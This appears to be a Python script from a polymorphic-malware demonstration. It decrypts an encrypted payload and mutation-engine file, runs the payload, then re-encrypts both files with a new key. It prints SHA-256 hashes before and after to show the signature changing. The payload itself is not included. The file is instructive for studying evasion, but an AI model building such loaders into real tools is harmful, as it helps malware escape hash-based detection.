# Initial decryoted Decryption Routine at the start of the program
def decryptionRoutine():
    from cryptography.fernet import Fernet
    # Read key for decryption
    with open('filekey.key', 'rb') as filekey:
        keys = filekey.read()
    # Create our decryptor
    decryptor = Fernet(keys)
    return decryptor

# Function to print the signature of a file 
def printSignature(filename):
    import hashlib
    with open(filename,"rb") as f:
        bytes = f.read() # read entire file as bytes
    # Find the signature using SHA-256 hashing algorithm
    readable_hash = hashlib.sha256(bytes).hexdigest();
    print("Signature of file ", filename, " is ", readable_hash)

# Function to decrypt a file using the decryption routine passed
def decryptFile(filename, decryptor):
    with open(filename, 'rb') as enc_file:
        encrypted = enc_file.read()
    
    # decrypting the file
    decrypted = decryptor.decrypt(encrypted)
    
    # opening the file in write mode and
    # writing the decrypted data
    with open(filename, 'wb') as dec_file:
        dec_file.write(decrypted)

# Decryption Routine starts here
decryptor = decryptionRoutine()

# Print signatures before decryption of files
print("Signatures of files before decryption are")
printSignature("payload.py")
printSignature("mutationEngine.py")

# Decrypt the payload and mutation engine using the decryption routine
decryptFile("payload.py", decryptor)
decryptFile("mutationEngine.py", decryptor)

# Print signatures after decryption of files
print("Signatures of files after decryption are")
printSignature("payload.py")
printSignature("mutationEngine.py")

# Deliver our payload
import payload
payload.payLoad()

# Get encryption to encrypt files again
import encrypt
encryptor = encrypt.encryptionRoutine()

# Get new decryption routine from the mutation engine
import mutationEngine
decryptor = mutationEngine.decryptionRoutine()

# Re-encrypt our files
encrypt.encryptFile("payload.py", encryptor)
encrypt.encryptFile("mutationEngine.py", encryptor)

# Print signatures after encryption of files
print("Signatures of files after encryption are")
printSignature("payload.py")
printSignature("mutationEngine.py")
